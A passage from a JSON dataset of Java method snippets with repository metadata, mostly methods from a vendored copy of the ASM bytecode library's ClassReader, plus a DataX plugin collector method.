readInt(cpInfoOffsets[readUnsignedShort(currentOffset)]));\n        currentOffset += 2;\n        break;\n\n      case 'Z': // const_value_index, CONSTANT_Integer\n        annotationVisitor.visit(\n            elementName,\n            readInt(cpInfoOffsets[readUnsignedShort(currentOffset)]) == 0\n                ? Boolean.FALSE\n                : Boolean.TRUE);\n        currentOffset += 2;\n        break;\n      case 's': // const_value_index, CONSTANT_Utf8\n        annotationVisitor.visit(elementName, readUTF8(currentOffset, charBuffer));\n        currentOffset += 2;\n        break;\n      case 'e': // enum_const_value\n        annotationVisitor.visitEnum(\n            elementName,\n            readUTF8(currentOffset, charBuffer),\n            readUTF8(currentOffset + 2, charBuffer));\n        currentOffset += 4;\n        break;\n      case 'c': // class_info\n        annotationVisitor.visit(elementName, Type.getType(readUTF8(currentOffset, charBuffer)));\n        currentOffset += 2;\n        break;\n      case '@': // annotation_value\n        currentOffset =\n            readElementValues(\n                annotationVisitor.visitAnnotation(elementName, readUTF8(currentOffset, charBuffer)),\n                currentOffset + 2,\n                true,\n                charBuffer);\n        break;\n      case '[': // array_value\n        int numValues = readUnsignedShort(currentOffset);\n        currentOffset += 2;\n        if (numValues == 0) {\n          return readElementValues(\n              annotationVisitor.visitArray(elementName),\n              currentOffset - 2,\n              /* named = */ false,\n              charBuffer);\n        }\n        switch (classFileBuffer[currentOffset] & 0xFF) {\n          case 'B':\n            byte[] byteValues = new byte[numValues];\n            for (int i = 0; i < numValues; i++) {\n              byteValues[i] = (byte) readInt(cpInfoOffsets[readUnsignedShort(currentOffset + 1)]);\n              currentOffset += 3;\n            }\n            annotationVisitor.visit(elementName, byteValues);\n            break;\n          case 'Z':\n            boolean[] booleanValues = new boolean[numValues];\n            for (int i = 0; i < numValues; i++) {\n              booleanValues[i] = readInt(cpInfoOffsets[readUnsignedShort(currentOffset + 1)]) != 0;\n              currentOffset += 3;\n            }\n            annotationVisitor.visit(elementName, booleanValues);\n            break;\n          case 'S':\n            short[] shortValues = new short[numValues];\n            for (int i = 0; i < numValues; i++) {\n              shortValues[i] = (short) readInt(cpInfoOffsets[readUnsignedShort(currentOffset + 1)]);\n              currentOffset += 3;\n            }\n            annotationVisitor.visit(elementName, shortValues);\n            break;\n          case 'C':\n            char[] charValues = new char[numValues];\n            for (int i = 0; i < numValues; i++) {\n              charValues[i] = (char) readInt(cpInfoOffsets[readUnsignedShort(currentOffset + 1)]);\n              currentOffset += 3;\n            }\n            annotationVisitor.visit(elementName, charValues);\n            break;\n          case 'I':\n            int[] intValues = new int[numValues];\n            for (int i = 0; i < numValues; i++) {\n              intValues[i] = readInt(cpInfoOffsets[readUnsignedShort(currentOffset + 1)]);\n              currentOffset += 3;\n            }\n            annotationVisitor.visit(elementName, intValues);\n            break;\n          case 'J':\n            long[] longValues = new long[numValues];\n            for (int i = 0; i < numValues; i++) {\n              longValues[i] = readLong(cpInfoOffsets[readUnsignedShort(currentOffset + 1)]);\n              currentOffset += 3;\n            }\n            annotationVisitor.visit(elementName, longValues);\n            break;\n          case 'F':\n            float[] floatValues = new float[numValues];\n            for (int i = 0; i < numValues; i++) {\n              floatValues[i] =\n                  Float.intBitsToFloat(\n                      readInt(cpInfoOffsets[readUnsignedShort(currentOffset + 1)]));\n              currentOffset += 3;\n            }\n            annotationVisitor.visit(elementName, floatValues);\n            break;\n          case 'D':\n            double[] doubleValues = new double[numValues];\n            for (int i = 0; i < numValues; i++) {\n              doubleValues[i] =\n                  Double.longBitsToDouble(\n                      readLong(cpInfoOffsets[readUnsignedShort(currentOffset + 1)]));\n              currentOffset += 3;\n            }\n            annotationVisitor.visit(elementName, doubleValues);\n            break;\n          default:\n            currentOffset =\n                readElementValues(\n                    annotationVisitor.visitArray(elementName),\n                    currentOffset - 2,\n                    /* named = */ false,\n                    charBuffer);\n            break;\n        }\n        break;\n      default:\n        throw new IllegalArgumentException();\n    }\n    return currentOffset;\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59279, "method_name": "computeImplicitFrame", "class_name": "ClassReader", "params": ["Context"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void computeImplicitFrame(final Context context) {\n    String methodDescriptor = context.currentMethodDescriptor;\n    Object[] locals = context.currentFrameLocalTypes;\n    int numLocal = 0;\n    if ((context.currentMethodAccessFlags & Opcodes.ACC_STATIC) == 0) {\n      if (\"<init>\".equals(context.currentMethodName)) {\n        locals[numLocal++] = Opcodes.UNINITIALIZED_THIS;\n      } else {\n        locals[numLocal++] = readClass(header + 2, context.charBuffer);\n      }\n    }\n    // Parse the method descriptor, one argument type descriptor at each iteration. Start by\n    // skipping the first method descriptor character, which is always '('.\n    int currentMethodDescritorOffset = 1;\n    while (true) {\n      int currentArgumentDescriptorStartOffset = currentMethodDescritorOffset;\n      switch (methodDescriptor.charAt(currentMethodDescritorOffset++)) {\n        case 'Z':\n        case 'C':\n        case 'B':\n        case 'S':\n        case 'I':\n          locals[numLocal++] = Opcodes.INTEGER;\n          break;\n        case 'F':\n          locals[numLocal++] = Opcodes.FLOAT;\n          break;\n        case 'J':\n          locals[numLocal++] = Opcodes.LONG;\n          break;\n        case 'D':\n          locals[numLocal++] = Opcodes.DOUBLE;\n          break;\n        case '[':\n          while (methodDescriptor.charAt(currentMethodDescritorOffset) == '[') {\n            ++currentMethodDescritorOffset;\n          }\n          if (methodDescriptor.charAt(currentMethodDescritorOffset) == 'L') {\n            ++currentMethodDescritorOffset;\n            while (methodDescriptor.charAt(currentMethodDescritorOffset) != ';') {\n              ++currentMethodDescritorOffset;\n            }\n          }\n          locals[numLocal++] =\n              methodDescriptor.substring(\n                  currentArgumentDescriptorStartOffset, ++currentMethodDescritorOffset);\n          break;\n        case 'L':\n          while (methodDescriptor.charAt(currentMethodDescritorOffset) != ';') {\n            ++currentMethodDescritorOffset;\n          }\n          locals[numLocal++] =\n              methodDescriptor.substring(\n                  currentArgumentDescriptorStartOffset + 1, currentMethodDescritorOffset++);\n          break;\n        default:\n          context.currentFrameLocalCount = numLocal;\n          return;\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59280, "method_name": "readStackMapFrame", "class_name": "ClassReader", "params": ["int", "boolean", "boolean", "Context"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "  private int readStackMapFrame(\n      final int stackMapFrameOffset,\n      final boolean compressed,\n      final boolean expand,\n      final Context context) {\n    int currentOffset = stackMapFrameOffset;\n    final char[] charBuffer = context.charBuffer;\n    final Label[] labels = context.currentMethodLabels;\n    int frameType;\n    if (compressed) {\n      // Read the frame_type field.\n      frameType = classFileBuffer[currentOffset++] & 0xFF;\n    } else {\n      frameType = Frame.FULL_FRAME;\n      context.currentFrameOffset = -1;\n    }\n    int offsetDelta;\n    context.currentFrameLocalCountDelta = 0;\n    if (frameType < Frame.SAME_LOCALS_1_STACK_ITEM_FRAME) {\n      offsetDelta = frameType;\n      context.currentFrameType = Opcodes.F_SAME;\n      context.currentFrameStackCount = 0;\n    } else if (frameType < Frame.RESERVED) {\n      offsetDelta = frameType - Frame.SAME_LOCALS_1_STACK_ITEM_FRAME;\n      currentOffset =\n          readVerificationTypeInfo(\n              currentOffset, context.currentFrameStackTypes, 0, charBuffer, labels);\n      context.currentFrameType = Opcodes.F_SAME1;\n      context.currentFrameStackCount = 1;\n    } else if (frameType >= Frame.SAME_LOCALS_1_STACK_ITEM_FRAME_EXTENDED) {\n      offsetDelta = readUnsignedShort(currentOffset);\n      currentOffset += 2;\n      if (frameType == Frame.SAME_LOCALS_1_STACK_ITEM_FRAME_EXTENDED) {\n        currentOffset =\n            readVerificationTypeInfo(\n                currentOffset, context.currentFrameStackTypes, 0, charBuffer, labels);\n        context.currentFrameType = Opcodes.F_SAME1;\n        context.currentFrameStackCount = 1;\n      } else if (frameType >= Frame.CHOP_FRAME && frameType < Frame.SAME_FRAME_EXTENDED) {\n        context.currentFrameType = Opcodes.F_CHOP;\n        context.currentFrameLocalCountDelta = Frame.SAME_FRAME_EXTENDED - frameType;\n        context.currentFrameLocalCount -= context.currentFrameLocalCountDelta;\n        context.currentFrameStackCount = 0;\n      } else if (frameType == Frame.SAME_FRAME_EXTENDED) {\n        context.currentFrameType = Opcodes.F_SAME;\n        context.currentFrameStackCount = 0;\n      } else if (frameType < Frame.FULL_FRAME) {\n        int local = expand ? context.currentFrameLocalCount : 0;\n        for (int k = frameType - Frame.SAME_FRAME_EXTENDED; k > 0; k--) {\n          currentOffset =\n              readVerificationTypeInfo(\n                  currentOffset, context.currentFrameLocalTypes, local++, charBuffer, labels);\n        }\n        context.currentFrameType = Opcodes.F_APPEND;\n        context.currentFrameLocalCountDelta = frameType - Frame.SAME_FRAME_EXTENDED;\n        context.currentFrameLocalCount += context.currentFrameLocalCountDelta;\n        context.currentFrameStackCount = 0;\n      } else {\n        final int numberOfLocals = readUnsignedShort(currentOffset);\n        currentOffset += 2;\n        context.currentFrameType = Opcodes.F_FULL;\n        context.currentFrameLocalCountDelta = numberOfLocals;\n        context.currentFrameLocalCount = numberOfLocals;\n        for (int local = 0; local < numberOfLocals; ++local) {\n          currentOffset =\n              readVerificationTypeInfo(\n                  currentOffset, context.currentFrameLocalTypes, local, charBuffer, labels);\n        }\n        final int numberOfStackItems = readUnsignedShort(currentOffset);\n        currentOffset += 2;\n        context.currentFrameStackCount = numberOfStackItems;\n        for (int stack = 0; stack < numberOfStackItems; ++stack) {\n          currentOffset =\n              readVerificationTypeInfo(\n                  currentOffset, context.currentFrameStackTypes, stack, charBuffer, labels);\n        }\n      }\n    } else {\n      throw new IllegalArgumentException();\n    }\n    context.currentFrameOffset += offsetDelta + 1;\n    createLabel(context.currentFrameOffset, labels);\n    return currentOffset;\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59281, "method_name": "readVerificationTypeInfo", "class_name": "ClassReader", "params": ["int", "Object", "int", "char", "Label"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "  private int readVerificationTypeInfo(\n      final int verificationTypeInfoOffset,\n      final Object[] frame,\n      final int index,\n      final char[] charBuffer,\n      final Label[] labels) {\n    int currentOffset = verificationTypeInfoOffset;\n    int tag = classFileBuffer[currentOffset++] & 0xFF;\n    switch (tag) {\n      case Frame.ITEM_TOP:\n        frame[index] = Opcodes.TOP;\n        break;\n      case Frame.ITEM_INTEGER:\n        frame[index] = Opcodes.INTEGER;\n        break;\n      case Frame.ITEM_FLOAT:\n        frame[index] = Opcodes.FLOAT;\n        break;\n      case Frame.ITEM_DOUBLE:\n        frame[index] = Opcodes.DOUBLE;\n        break;\n      case Frame.ITEM_LONG:\n        frame[index] = Opcodes.LONG;\n        break;\n      case Frame.ITEM_NULL:\n        frame[index] = Opcodes.NULL;\n        break;\n      case Frame.ITEM_UNINITIALIZED_THIS:\n        frame[index] = Opcodes.UNINITIALIZED_THIS;\n        break;\n      case Frame.ITEM_OBJECT:\n        frame[index] = readClass(currentOffset, charBuffer);\n        currentOffset += 2;\n        break;\n      case Frame.ITEM_UNINITIALIZED:\n        frame[index] = createLabel(readUnsignedShort(currentOffset), labels);\n        currentOffset += 2;\n        break;\n      default:\n        throw new IllegalArgumentException();\n    }\n    return currentOffset;\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59282, "method_name": "getFirstAttributeOffset", "class_name": "ClassReader", "params": [], "throws": null, "modifiers": ["final"], "return_type": "int", "snippet": "  final int getFirstAttributeOffset() {\n    // Skip the access_flags, this_class, super_class, and interfaces_count fields (using 2 bytes\n    // each), as well as the interfaces array field (2 bytes per interface).\n    int currentOffset = header + 8 + readUnsignedShort(header + 6) * 2;\n\n    // Read the fields_count field.\n    int fieldsCount = readUnsignedShort(currentOffset);\n    currentOffset += 2;\n    // Skip the 'fields' array field.\n    while (fieldsCount-- > 0) {\n      // Invariant: currentOffset is the offset of a field_info structure.\n      // Skip the access_flags, name_index and descriptor_index fields (2 bytes each), and read the\n      // attributes_count field.\n      int attributesCount = readUnsignedShort(currentOffset + 6);\n      currentOffset += 8;\n      // Skip the 'attributes' array field.\n      while (attributesCount-- > 0) {\n        // Invariant: currentOffset is the offset of an attribute_info structure.\n        // Read the attribute_length field (2 bytes after the start of the attribute_info) and skip\n        // this many bytes, plus 6 for the attribute_name_index and attribute_length fields\n        // (yielding the total size of the attribute_info structure).\n        currentOffset += 6 + readInt(currentOffset + 2);\n      }\n    }\n\n    // Skip the methods_count and 'methods' fields, using the same method as above.\n    int methodsCount = readUnsignedShort(currentOffset);\n    currentOffset += 2;\n    while (methodsCount-- > 0) {\n      int attributesCount = readUnsignedShort(currentOffset + 6);\n      currentOffset += 8;\n      while (attributesCount-- > 0) {\n        currentOffset += 6 + readInt(currentOffset + 2);\n      }\n    }\n\n    // Skip the ClassFile's attributes_count field.\n    return currentOffset + 2;\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59283, "method_name": "readBootstrapMethodsAttribute", "class_name": "ClassReader", "params": ["int"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "  private int[] readBootstrapMethodsAttribute(final int maxStringLength) {\n    char[] charBuffer = new char[maxStringLength];\n    int currentAttributeOffset = getFirstAttributeOffset();\n    int[] currentBootstrapMethodOffsets = null;\n    for (int i = readUnsignedShort(currentAttributeOffset - 2); i > 0; --i) {\n      // Read the attribute_info's attribute_name and attribute_length fields.\n      String attributeName = readUTF8(currentAttributeOffset, charBuffer);\n      int attributeLength = readInt(currentAttributeOffset + 2);\n      currentAttributeOffset += 6;\n      if (Constants.BOOTSTRAP_METHODS.equals(attributeName)) {\n        // Read the num_bootstrap_methods field and create an array of this size.\n        currentBootstrapMethodOffsets = new int[readUnsignedShort(currentAttributeOffset)];\n        // Compute and store the offset of each 'bootstrap_methods' array field entry.\n        int currentBootstrapMethodOffset = currentAttributeOffset + 2;\n        for (int j = 0; j < currentBootstrapMethodOffsets.length; ++j) {\n          currentBootstrapMethodOffsets[j] = currentBootstrapMethodOffset;\n          // Skip the bootstrap_method_ref and num_bootstrap_arguments fields (2 bytes each),\n          // as well as the bootstrap_arguments array field (of size num_bootstrap_arguments * 2).\n          currentBootstrapMethodOffset +=\n              4 + readUnsignedShort(currentBootstrapMethodOffset + 2) * 2;\n        }\n        return currentBootstrapMethodOffsets;\n      }\n      currentAttributeOffset += attributeLength;\n    }\n    throw new IllegalArgumentException();\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59284, "method_name": "readAttribute", "class_name": "ClassReader", "params": ["Attribute", "String", "int", "int", "char", "int", "Label"], "throws": null, "modifiers": ["private"], "return_type": "Attribute", "snippet": "  private Attribute readAttribute(\n      final Attribute[] attributePrototypes,\n      final String type,\n      final int offset,\n      final int length,\n      final char[] charBuffer,\n      final int codeAttributeOffset,\n      final Label[] labels) {\n    for (Attribute attributePrototype : attributePrototypes) {\n      if (attributePrototype.type.equals(type)) {\n        return attributePrototype.read(\n            this, offset, length, charBuffer, codeAttributeOffset, labels);\n      }\n    }\n    return new Attribute(type).read(this, offset, length, null, -1, null);\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59285, "method_name": "getItemCount", "class_name": "ClassReader", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getItemCount() {\n    return cpInfoOffsets.length;\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59286, "method_name": "getItem", "class_name": "ClassReader", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getItem(final int constantPoolEntryIndex) {\n    return cpInfoOffsets[constantPoolEntryIndex];\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59287, "method_name": "getMaxStringLength", "class_name": "ClassReader", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getMaxStringLength() {\n    return maxStringLength;\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59288, "method_name": "readByte", "class_name": "ClassReader", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int readByte(final int offset) {\n    return classFileBuffer[offset] & 0xFF;\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59289, "method_name": "readUnsignedShort", "class_name": "ClassReader", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int readUnsignedShort(final int offset) {\n    byte[] classBuffer = classFileBuffer;\n    return ((classBuffer[offset] & 0xFF) << 8) | (classBuffer[offset + 1] & 0xFF);\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59290, "method_name": "readShort", "class_name": "ClassReader", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "short", "snippet": "  public short readShort(final int offset) {\n    byte[] classBuffer = classFileBuffer;\n    return (short) (((classBuffer[offset] & 0xFF) << 8) | (classBuffer[offset + 1] & 0xFF));\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59291, "method_name": "readInt", "class_name": "ClassReader", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int readInt(final int offset) {\n    byte[] classBuffer = classFileBuffer;\n    return ((classBuffer[offset] & 0xFF) << 24)\n        | ((classBuffer[offset + 1] & 0xFF) << 16)\n        | ((classBuffer[offset + 2] & 0xFF) << 8)\n        | (classBuffer[offset + 3] & 0xFF);\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59292, "method_name": "readLong", "class_name": "ClassReader", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "  public long readLong(final int offset) {\n    long l1 = readInt(offset);\n    long l0 = readInt(offset + 4) & 0xFFFFFFFFL;\n    return (l1 << 32) | l0;\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59293, "method_name": "readUTF8", "class_name": "ClassReader", "params": ["int", "char"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String readUTF8(final int offset, final char[] charBuffer) {\n    int constantPoolEntryIndex = readUnsignedShort(offset);\n    if (offset == 0 || constantPoolEntryIndex == 0) {\n      return null;\n    }\n    return readUtf(constantPoolEntryIndex, charBuffer);\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59294, "method_name": "readUtf", "class_name": "ClassReader", "params": ["int", "char"], "throws": null, "modifiers": ["final"], "return_type": "String", "snippet": "  final String readUtf(final int constantPoolEntryIndex, final char[] charBuffer) {\n    String value = constantUtf8Values[constantPoolEntryIndex];\n    if (value != null) {\n      return value;\n    }\n    int cpInfoOffset = cpInfoOffsets[constantPoolEntryIndex];\n    return constantUtf8Values[constantPoolEntryIndex] =\n        readUtf(cpInfoOffset + 2, readUnsignedShort(cpInfoOffset), charBuffer);\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59295, "method_name": "readUtf", "class_name": "ClassReader", "params": ["int", "int", "char"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "  private String readUtf(final int utfOffset, final int utfLength, final char[] charBuffer) {\n    int currentOffset = utfOffset;\n    int endOffset = currentOffset + utfLength;\n    int strLength = 0;\n    byte[] classBuffer = classFileBuffer;\n    while (currentOffset < endOffset) {\n      int currentByte = classBuffer[currentOffset++];\n      if ((currentByte & 0x80) == 0) {\n        charBuffer[strLength++] = (char) (currentByte & 0x7F);\n      } else if ((currentByte & 0xE0) == 0xC0) {\n        charBuffer[strLength++] =\n            (char) (((currentByte & 0x1F) << 6) + (classBuffer[currentOffset++] & 0x3F));\n      } else {\n        charBuffer[strLength++] =\n            (char)\n                (((currentByte & 0xF) << 12)\n                    + ((classBuffer[currentOffset++] & 0x3F) << 6)\n                    + (classBuffer[currentOffset++] & 0x3F));\n      }\n    }\n    return new String(charBuffer, 0, strLength);\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59296, "method_name": "readStringish", "class_name": "ClassReader", "params": ["int", "char"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "  private String readStringish(final int offset, final char[] charBuffer) {\n    // Get the start offset of the cp_info structure (plus one), and read the CONSTANT_Utf8 entry\n    // designated by the first two bytes of this cp_info.\n    return readUTF8(cpInfoOffsets[readUnsignedShort(offset)], charBuffer);\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59297, "method_name": "readClass", "class_name": "ClassReader", "params": ["int", "char"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String readClass(final int offset, final char[] charBuffer) {\n    return readStringish(offset, charBuffer);\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59298, "method_name": "readModule", "class_name": "ClassReader", "params": ["int", "char"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String readModule(final int offset, final char[] charBuffer) {\n    return readStringish(offset, charBuffer);\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59299, "method_name": "readPackage", "class_name": "ClassReader", "params": ["int", "char"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String readPackage(final int offset, final char[] charBuffer) {\n    return readStringish(offset, charBuffer);\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59300, "method_name": "readConstantDynamic", "class_name": "ClassReader", "params": ["int", "char"], "throws": null, "modifiers": ["private"], "return_type": "ConstantDynamic", "snippet": "  private ConstantDynamic readConstantDynamic(\n      final int constantPoolEntryIndex, final char[] charBuffer) {\n    ConstantDynamic constantDynamic = constantDynamicValues[constantPoolEntryIndex];\n    if (constantDynamic != null) {\n      return constantDynamic;\n    }\n    int cpInfoOffset = cpInfoOffsets[constantPoolEntryIndex];\n    int nameAndTypeCpInfoOffset = cpInfoOffsets[readUnsignedShort(cpInfoOffset + 2)];\n    String name = readUTF8(nameAndTypeCpInfoOffset, charBuffer);\n    String descriptor = readUTF8(nameAndTypeCpInfoOffset + 2, charBuffer);\n    int bootstrapMethodOffset = bootstrapMethodOffsets[readUnsignedShort(cpInfoOffset)];\n    Handle handle = (Handle) readConst(readUnsignedShort(bootstrapMethodOffset), charBuffer);\n    Object[] bootstrapMethodArguments = new Object[readUnsignedShort(bootstrapMethodOffset + 2)];\n    bootstrapMethodOffset += 4;\n    for (int i = 0; i < bootstrapMethodArguments.length; i++) {\n      bootstrapMethodArguments[i] = readConst(readUnsignedShort(bootstrapMethodOffset), charBuffer);\n      bootstrapMethodOffset += 2;\n    }\n    return constantDynamicValues[constantPoolEntryIndex] =\n        new ConstantDynamic(name, descriptor, handle, bootstrapMethodArguments);\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59301, "method_name": "readConst", "class_name": "ClassReader", "params": ["int", "char"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object readConst(final int constantPoolEntryIndex, final char[] charBuffer) {\n    int cpInfoOffset = cpInfoOffsets[constantPoolEntryIndex];\n    switch (classFileBuffer[cpInfoOffset - 1]) {\n      case Symbol.CONSTANT_INTEGER_TAG:\n        return readInt(cpInfoOffset);\n      case Symbol.CONSTANT_FLOAT_TAG:\n        return Float.intBitsToFloat(readInt(cpInfoOffset));\n      case Symbol.CONSTANT_LONG_TAG:\n        return readLong(cpInfoOffset);\n      case Symbol.CONSTANT_DOUBLE_TAG:\n        return Double.longBitsToDouble(readLong(cpInfoOffset));\n      case Symbol.CONSTANT_CLASS_TAG:\n        return Type.getObjectType(readUTF8(cpInfoOffset, charBuffer));\n      case Symbol.CONSTANT_STRING_TAG:\n        return readUTF8(cpInfoOffset, charBuffer);\n      case Symbol.CONSTANT_METHOD_TYPE_TAG:\n        return Type.getMethodType(readUTF8(cpInfoOffset, charBuffer));\n      case Symbol.CONSTANT_METHOD_HANDLE_TAG:\n        int referenceKind = readByte(cpInfoOffset);\n        int referenceCpInfoOffset = cpInfoOffsets[readUnsignedShort(cpInfoOffset + 1)];\n        int nameAndTypeCpInfoOffset = cpInfoOffsets[readUnsignedShort(referenceCpInfoOffset + 2)];\n        String owner = readClass(referenceCpInfoOffset, charBuffer);\n        String name = readUTF8(nameAndTypeCpInfoOffset, charBuffer);\n        String descriptor = readUTF8(nameAndTypeCpInfoOffset + 2, charBuffer);\n        boolean isInterface =\n            classFileBuffer[referenceCpInfoOffset - 1] == Symbol.CONSTANT_INTERFACE_METHODREF_TAG;\n        return new Handle(referenceKind, owner, name, descriptor, isInterface);\n      case Symbol.CONSTANT_DYNAMIC_TAG:\n        return readConstantDynamic(constantPoolEntryIndex, charBuffer);\n      default:\n        throw new IllegalArgumentException();\n    }\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59302, "method_name": "collectDirtyRecord", "class_name": "TaskPluginCollector", "params": ["Record", "Throwable", "String"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void collectDirtyRecord(final Record dirtyRecord,\n                                            final Throwable t, final String errorMessage);\n\n    /**\n     * \u6536\u96c6\u810f\u6570\u636e\n     *\n     * @param dirtyRecord  \u810f\u6570\u636e\u4fe1\u606f\n     * @param errorMessage \u9519\u8bef\u7684\u63d0\u793a\u4fe1\u606f\n     */\n    public void collectDirtyRecord(final Record dirtyRecord,\n                                   final String errorMessage) {\n        this.collectDirtyRecord(dirtyRecord, null, errorMessage);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/plugin/TaskPluginCollector.java", "stars": "23", "class_props": {"extends": null, "implements": ["PluginCollector"], "modifiers": ["public", "abstract"]}}, {"id": 59303, "method_name": "collectDirtyRecord", "class_name": 